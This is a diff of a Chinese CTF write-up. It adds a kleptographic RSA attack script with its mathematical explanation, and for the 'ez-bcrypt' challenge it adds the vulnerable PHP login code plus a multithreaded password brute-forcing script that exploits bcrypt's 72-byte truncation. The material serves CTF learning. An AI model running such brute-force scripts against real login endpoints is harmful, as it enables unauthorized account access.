@@ -90,9 +90,100 @@ http://public-chall-2025.mocsctf.com:31005/tmp/046342ca1db298c5.php?1=php://filt
 
 ### ez-klepto
 
+#### 比赛时的非预期解
+
 Y可以开平方分解出来PQ，s的恢复方法是`s=pow(n>>1024,d_Y,Y)`，然后利用漏洞恢复p即可`p = gmpy2.next_prime(int(sha256(str(s).encode() * 4).hexdigest(), 16))`
 
 后面求出q，直接拿q算就行了
+
+#### 预期解
+
+官方wp出来了，看了一下，原来是论文啊，Kleptography: Using Cryptography Against Cryptography这个论文，赛时没有找到  
+
+简单的看了一下，不难其实，就直接打，没有魔改什么
+
+exp.py 
+
+```python
+from hashlib import sha256
+from gmpy2 import *
+from Crypto.Util.number import *
+
+def fermat(num):
+    x = iroot(num, 2)[0]
+    if x * x < num:
+        x += 1
+
+    # y^2 = x^2 - num
+    while (True):
+        y2 = x * x - num
+        y = iroot(y2, 2)[0]
+        if y * y == y2:
+            break
+        x += 1
+
+    result = [int(x + y), int(x - y)]
+    return result[0]
+
+Y = 
+n = 
+c = 
+
+P = fermat(Y)
+Q = Y//P
+assert P * Q == Y
+d = inverse(65537,(P-1)*(Q-1))
+
+c_s = int(bin(n)[2:1023+2],2)
+s = pow(c_s,d,Y)
+p = next_prime(int(sha256(str(s).encode()*4).hexdigest(),16))
+
+if gcd(p,n) > 1:
+    print('get p',p)
+    q = n//p
+    phi = (p-1)*(q-1)
+    d = inverse(65537,phi)
+    print(long_to_bytes(pow(c,d,n)).decode())
+```
+
+那么为什么非预期可以呢，其实就是
+
+因为
+\[
+\texttt{tmp} = (c \ll 1024) + RND,
+\]
+而
+\[
+n = \texttt{tmp} - r,
+\]
+所以
+\[
+\frac{n}{2^{1024}} = c + \frac{RND - r}{2^{1024}}.
+\]
+
+注意：
+\[
+RND < 2^{1024}, \quad r < p \approx 2^{512},
+\]
+因此
+\[
+|RND - r| < 2^{1024},
+\quad \frac{RND - r}{2^{1024}} \in (-1,1).
+\]
+
+也就是说
+\[
+\frac{n}{2^{1024}} = c + \varepsilon, \quad \varepsilon \in (-1,1).
+\]
+
+于是直接取整：
+\[
+c \approx n \gg 1024,
+\]
+最多差 1（因为可能进位/借位），
+
+这就是课件里所说的：
+*“the (-r) operation will not ruin $c$ by more than one bit”*。
 
 ### ez-math
 
@@ -102,7 +193,81 @@ pq直接开平方出来，后面的处理就是crt了xd
 
 ### ez-bcrypt(补题)
 
-抽象题哥们，bp爆破，看响应，部分会有flag
+index.php
+
+```php
+<?php
+function generate_uuid_v4() {
+    $data = random_bytes(16);
+
+    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
+    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
+
+    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
+}
+
+error_reporting(0);
+ini_set('display_errors', 0);
+
+$flag = file_get_contents('/flag.txt');
+session_start();
+
+$usernameAdmin = 'admin';
+$passwordAdmin = generate_uuid_v4();
+
+$entropy = "My-password-is-super-secure-that-You'd-never-guess-it-Hia-hiahia";
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'] ?? '';
+    $password = $_POST['password'] ?? '';
+
+    $hash = password_hash($usernameAdmin . $entropy . $passwordAdmin, PASSWORD_BCRYPT);
+
+    if ($usernameAdmin === $username && password_verify($username . $entropy . $password, $hash)) {
+        $_SESSION['logged_in'] = true;
+    }
+}
+?>
+```
+
+这是题目给的php代码，可以注意到密码用的是`PASSWORD_BCRYPT`，这个方法用72长度的加密，题目中的`entropy`是69字节，那么3字节是可以爆破的，多线程爆破就行
+
+```python
+import requests
+import string
+from concurrent.futures import ThreadPoolExecutor
+
+url = ""
+combinations = string.ascii_lowercase + string.digits
+
+password = []
+for i in combinations:
+    for j in combinations:
+        for k in combinations:
+            password.append(f"{i}{j}{k}")
+
+
+def try_password(password_attempt):
+    r = requests.post(url, data={"username": "admin", "password": password_attempt})
+    if "MOCSCTF{" in r.text:
+        return f"Found flag: {r.text}"
+    else:
+        return f"{password_attempt} is not right"
+
+
+def start_threads():
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        results = executor.map(try_password, password)
+
+        for result in results:
+            print(result)
+            if "Found flag" in result:
+                exit()
+
+
+if __name__ == '__main__':
+    start_threads()
+```
 
 ### ez-DHKE(补题)
 
@@ -330,3 +495,4 @@ print(f"Extracted flag: {flag}")
 ## 后话
 
 cry有两题等wp复现，mem那个取证比赛的时候没找到host，可惜了bro
+
